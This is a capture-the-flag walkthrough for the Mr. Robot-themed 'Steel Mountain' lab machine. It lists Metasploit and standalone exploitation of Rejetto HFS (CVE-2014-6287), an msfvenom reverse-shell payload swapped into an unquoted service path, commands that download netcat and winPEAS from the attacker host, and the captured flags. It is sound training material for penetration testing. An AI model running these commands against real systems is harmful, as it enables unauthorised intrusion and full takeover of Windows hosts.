# Steel Mountain 

> Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

<br>

### Process

1. Introduction:
   - goto web site -> look at filename of image of employee
   - employee of the month = **Bill Harper**
2. Initial Access:
   - port scanning the machine with nmap:
     - `nmap -T4 10.10.122.82`
     - other port running a web server = **8080**
   - version scanning the web server with nmap:
     - `nmap -sV -p8080 10.10.122.82` + lookup name of file server
     - file server running = **rejetto http file server**
   - search exploit.db for CVE:
     - found CVE number = **2014-6287**
   - use Metasploit to gain initial shell:
     - `msfconsole` -> `search 2014-6287` -> `use 0` -> `options`
     - `set RHOST 10.10.122.82` -> `set RPORT 8080` -> `run`
   - find user flag:
     - `search -f user.txt` -> `cd /users/bill/desktop` -> `cat user.txt`
     - user flag = **b04763b6fcf51fcd7c13abc7db4fd365**
3. Privilege escalation:
   - upload a powershell privilege escalation script [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) to machine (assuming it is downloaded and in current directory on attack machine):
     - `upload PowerUp.ps1`
   - execute powershell script using Meterpreter:
     - get a powershell shell: `load powershell` -> `powershell_shell`
     - load script: `. .\PowerUp.ps`
     - check fo common Windows privilege escalation vectors: `Invoke-AllChecks`
   - check for *unquoted serivce path* vulnerability with *CanRestart* option set to true:
     - found service = **AdvancedSystemCareService9**
   - > CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program
    - use msfvenom to generate a reverse shell Windows executable with the same name as the vulnerable service and upload it to target:
      - attack box: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.57.183 LPORT=1234 -e x86/shikata_ga_nai -f exe -o ASCService.exe`
      - target box: `upload ASCService.exe`
    - start Metasploit multi-handler to listen and recieve reverse shell (in another tmux window):
      - `use multi/handler` -> `set LHOST 10.10.57.183` -> `set LPORT 1234` -> `run`
      - background current meterpreter shell and setup a new multi-handler session 
    - go back to original meterpreter session, get a Windows shell, and stop the AdvancedSystemCareService9 service:
      - `sessions 1` -> `shell` -> `sc stop AdvancedSystemCareService9`
    - copy the payload to the location of the vulnerable service (replacing the service) while in Windows shell:
      - `copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"` -> [yes]
    - restart the service:
      - `sc start AdvancedSystemCareService9`
     - drop back to metasploit mulit/handler tmux window to then interact with the reverse shell
     - find root flag:
       - `cd \Users\Adminstrator\Desktop` -> `type root.txt`
       - root flag = **9af5f314f57607c00fd09803a587db80**
4. Access and Escalation Without Metasploit:
   - this time using this [exploit](https://www.exploit-db.com/exploits/39161):
   - download exploit, make changes to local IP address/port, and save as "exploit.py"
   - get at static Windows x86 netcat binary (from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)) and save that as "nc.exe"
   - exploit:
     - start python webserver (in same directory as "nc.exe"): `python3 -m http.server 80`
     - start netcat listener: `nc -lvnp 1234`
     - run exploit: `python2 exploit.py 10.10.122.82 8080`
     - the exploit will run, download the "nc.exe" file which from your local web server, and then execute it which will connect back to your netcat listner and you'll have a shell on the target machine
   - pull winPEAS to the system using powershell -c command:
     - `powershell -c "Invoke-WebRequest -OutFile winPEAS.exe http://10.10.57.183/winPEASx64.exe"`
     - keep "winPEASx64.exe" in same directory as other files for convienence
   - run winPEAS: `winPEAS.exe`
     - it provides you with the name of the vulnerable service running (AdvancedSystemCareService9) and it's location
     - can manually find out the service name with **powershell -c "Get-Service"**, which lists services
   - now you can privilege escalate as before